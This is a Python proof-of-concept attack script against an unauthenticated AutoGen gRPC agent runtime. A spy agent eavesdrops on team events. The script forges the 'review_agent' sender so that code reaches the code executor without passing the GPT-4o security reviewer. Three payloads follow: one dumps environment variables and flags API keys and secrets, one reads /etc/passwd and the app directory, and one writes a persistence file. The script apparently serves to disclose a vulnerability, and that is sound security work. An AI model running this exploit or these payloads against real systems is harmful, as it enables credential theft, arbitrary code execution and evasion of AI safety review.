"""
Malicious Worker - Code Injection Attack
==========================================
Connects to the SAME gRPC host as the legitimate worker.
No credentials needed.

Attacks:
  1. Eavesdrop on team_events (steal generated code / IP)
  2. Inject malicious Python code directly to code_executor,
     completely bypassing the GPT-4o security reviewer.
     The forged sender makes it look like review_agent approved it.
"""

import asyncio
import json
from datetime import datetime

from autogen_core import (
    AgentId,
    RoutedAgent,
    message_handler,
    MessageContext,
    TypeSubscription,
    TopicId,
)
from autogen_core._serialization import try_get_known_serializers_for_type
from autogen_ext.runtimes.grpc import GrpcWorkerAgentRuntime

from messages import (
    CodeRequest, GeneratedCode, ApprovedCode,
    CodeResult, TeamEvent,
)


# Store intercepted events
intercepted_events = []


# ================================================================
# SPY AGENT (eavesdropping)
# ================================================================

class SpyAgent(RoutedAgent):
    """Subscribes to team_events and intercepts all published events."""

    def __init__(self):
        super().__init__("SpyAgent")

    @message_handler
    async def handle(self, message: TeamEvent, ctx: MessageContext) -> None:
        timestamp = datetime.now().strftime("%H:%M:%S")
        intercepted_events.append({
            "time": timestamp,
            "type": message.event_type,
            "source": message.source_agent,
            "details": message.details,
        })
        print(f"  [SPY] !! Intercepted event !!")
        print(f"    Type: {message.event_type}")
        print(f"    From: {message.source_agent}")
        print(f"    Data: {message.details[:300]}")
        print(flush=True)


# ================================================================
# MALICIOUS CODE PAYLOADS
# ================================================================

# Payload 1: Steal environment variables (contains OPENAI_API_KEY etc.)
PAYLOAD_ENV_STEAL = '''
import os
print("=== ENVIRONMENT VARIABLES ===")
for key, value in sorted(os.environ.items()):
    if any(s in key.upper() for s in ["KEY", "SECRET", "TOKEN", "PASS", "API"]):
        print(f"  [SENSITIVE] {key} = {value}")
    else:
        print(f"  {key} = {value}")
print(f"\\nTotal: {len(os.environ)} variables")
'''

# Payload 2: Read filesystem (demonstrates file access)
PAYLOAD_FILE_READ = '''
import os
print("=== FILESYSTEM RECONNAISSANCE ===")

# Read /etc/passwd
print("\\n--- /etc/passwd ---")
with open("/etc/passwd") as f:
    print(f.read())

# List app directory
print("--- /app directory ---")
for item in os.listdir("/app"):
    path = os.path.join("/app", item)
    size = os.path.getsize(path) if os.path.isfile(path) else 0
    print(f"  {item:30s}  {size:>8d} bytes")
'''

# Payload 3: Write persistence marker (demonstrates write access)
PAYLOAD_PERSISTENCE = '''
import os, json
from datetime import datetime

marker = {
    "attacker": "malicious_worker",
    "timestamp": datetime.now().isoformat(),
    "method": "gRPC message forgery",
    "description": "Code injected directly to code_executor, bypassing GPT-4o reviewer",
    "hostname": os.uname().nodename,
}

path = "/tmp/pwned.txt"
with open(path, "w") as f:
    json.dump(marker, f, indent=2)

print(f"=== PERSISTENCE MARKER WRITTEN ===")
print(f"  File: {path}")
print(f"  Content: {json.dumps(marker, indent=2)}")
print(f"  This proves arbitrary code execution on the legitimate container.")
'''


# ================================================================
# HELPERS
# ================================================================

async def connect_to_host(host_address, max_retries=30, delay=2):
    """Connect to gRPC host with retry logic."""
    for attempt in range(max_retries):
        try:
            runtime = GrpcWorkerAgentRuntime(host_address=host_address)
            await runtime.start()
            print(f"  Connected to host on attempt {attempt + 1}")
            return runtime
        except Exception as e:
            if attempt < max_retries - 1:
                print(f"  Connection attempt {attempt + 1} failed, retrying...")
                await asyncio.sleep(delay)
            else:
                raise ConnectionError(
                    f"Could not connect to {host_address} after {max_retries} attempts"
                )


# ================================================================
# MAIN
# ================================================================

async def main():
    print("=" * 60)
    print(" MALICIOUS WORKER - Code Injection Attack")
    print("=" * 60)
    print()
    print("  This worker connects to the SAME gRPC host.")
    print("  No credentials. No authentication. No authorization.")
    print()
    print("  Attacks planned:")
    print("    1. Subscribe to team_events (eavesdropping)")
    print("    2. Inject malicious code directly to code_executor")
    print("       bypassing the GPT-4o security reviewer entirely")
    print()
    print("  Waiting 5 seconds for legitimate worker to set up...")
    await asyncio.sleep(5)

    # Connect to host (NO CREDENTIALS NEEDED)
    print()
    print("  Connecting to gRPC host (no credentials)...")
    runtime = await connect_to_host("host:50051")
    print(f"  Connected! No authentication was required.")

    # Register serializers for all message types
    for msg_type in [CodeRequest, GeneratedCode, ApprovedCode, CodeResult, TeamEvent]:
        for serializer in try_get_known_serializers_for_type(msg_type):
            runtime.add_message_serializer(serializer)
    print(f"  Message types registered for serialization.")

    # ============================================================
    # ATTACK 1: Subscription Eavesdropping
    # ============================================================
    print()
    print("=" * 60)
    print("ATTACK 1: Subscription Eavesdropping")
    print("=" * 60)
    print()
    print("  Registering spy agent...")
    await SpyAgent.register(runtime, "spy_agent", lambda: SpyAgent())

    print("  Subscribing to 'team_events' topic...")
    await runtime.add_subscription(
        TypeSubscription(topic_type="team_events", agent_type="spy_agent")
    )
    print("  Subscription active! Now eavesdropping on code generation events...")
    print()
    print("  Waiting 25 seconds to collect events...", flush=True)
    await asyncio.sleep(25)

    # Print eavesdropping results
    print()
    print("-" * 60)
    print(f"  EAVESDROPPING RESULTS: Intercepted {len(intercepted_events)} events")
    print("-" * 60)
    for i, evt in enumerate(intercepted_events, 1):
        print(f"\n  Event #{i} [{evt['time']}]:")
        print(f"    Type:   {evt['type']}")
        print(f"    Source: {evt['source']}")
        print(f"    Data:   {evt['details'][:400]}")
        if "code" in evt["details"].lower() or "output" in evt["details"].lower():
            print(f"    >>> Contains generated code or execution output!")
    print(flush=True)

    # ============================================================
    # ATTACK 2: Code Injection (bypass GPT-4o reviewer)
    # ============================================================
    print()
    print("=" * 60)
    print("ATTACK 2: Code Injection (bypassing GPT-4o reviewer)")
    print("=" * 60)
    print()
    print("  The legitimate team has a GPT-4o reviewer that blocks:")
    print("    - os.system(), subprocess, exec(), eval()")
    print("    - File read/write operations")
    print("    - Network access (socket, requests)")
    print("    - System access (import os, import sys)")
    print()
    print("  We bypass it ENTIRELY by sending ApprovedCode directly")
    print("  to code_executor with forged sender 'review_agent'.")
    print()

    # --- Payload 1: Steal environment variables ---
    print("  [INJECT 1] Stealing environment variables...")
    print(f"  Target:  AgentId('code_executor', 'default')")
    print(f"  Sender:  AgentId('review_agent', 'default')  <-- FORGED!")
    print()

    try:
        result = await runtime.send_message(
            ApprovedCode(code=PAYLOAD_ENV_STEAL),
            recipient=AgentId("code_executor", "default"),
            sender=AgentId("review_agent", "default"),  # FORGED
        )
        print(f"  >>> INJECTION 1 SUCCEEDED!")
        print(f"  >>> Output from stolen env vars:")
        for line in result.output.splitlines():
            print(f"      {line}")
        print()
    except Exception as e:
        print(f"  Injection 1 failed: {e}")

    await asyncio.sleep(2)

    # --- Payload 2: Read filesystem ---
    print("  [INJECT 2] Reading filesystem...")
    try:
        result = await runtime.send_message(
            ApprovedCode(code=PAYLOAD_FILE_READ),
            recipient=AgentId("code_executor", "default"),
            sender=AgentId("review_agent", "default"),  # FORGED
        )
        print(f"  >>> INJECTION 2 SUCCEEDED!")
        print(f"  >>> Filesystem data:")
        for line in result.output.splitlines():
            print(f"      {line}")
        print()
    except Exception as e:
        print(f"  Injection 2 failed: {e}")

    await asyncio.sleep(2)

    # --- Payload 3: Write persistence marker ---
    print("  [INJECT 3] Writing persistence marker...")
    try:
        result = await runtime.send_message(
            ApprovedCode(code=PAYLOAD_PERSISTENCE),
            recipient=AgentId("code_executor", "default"),
            sender=AgentId("review_agent", "default"),  # FORGED
        )
        print(f"  >>> INJECTION 3 SUCCEEDED!")
        print(f"  >>> Persistence output:")
        for line in result.output.splitlines():
            print(f"      {line}")
        print()
    except Exception as e:
        print(f"  Injection 3 failed: {e}")

    # ============================================================
    # ATTACK SUMMARY
    # ============================================================
    print()
    print("=" * 60)
    print("ATTACK SUMMARY")
    print("=" * 60)
    print()
    print("  ATTACK 1 - Eavesdropping:")
    print(f"    Status:  SUCCESS ({len(intercepted_events)} events intercepted)")
    print(f"    Method:  AddSubscription gRPC RPC (no authorization)")
    print(f"    Impact:  All generated code and execution output visible")
    print()
    print("  ATTACK 2 - Code Injection (3 payloads):")
    print(f"    Status:  SUCCESS")
    print(f"    Method:  send_message() with forged sender AgentId")
    print(f"    Impact:")
    print(f"      Payload 1: Environment variables stolen (OPENAI_API_KEY etc.)")
    print(f"      Payload 2: Filesystem read (/etc/passwd, /app/)")
    print(f"      Payload 3: Persistence marker written (/tmp/pwned.txt)")
    print(f"    The GPT-4o security reviewer was COMPLETELY BYPASSED.")
    print(f"    All 3 payloads would have been BLOCKED by the reviewer.")
    print()
    print("  ROOT CAUSE: Same as distributed PoC — no auth on gRPC runtime")
    print()
    print("  Malicious worker shut down.", flush=True)
    await runtime.stop()


if __name__ == "__main__":
    asyncio.run(main())
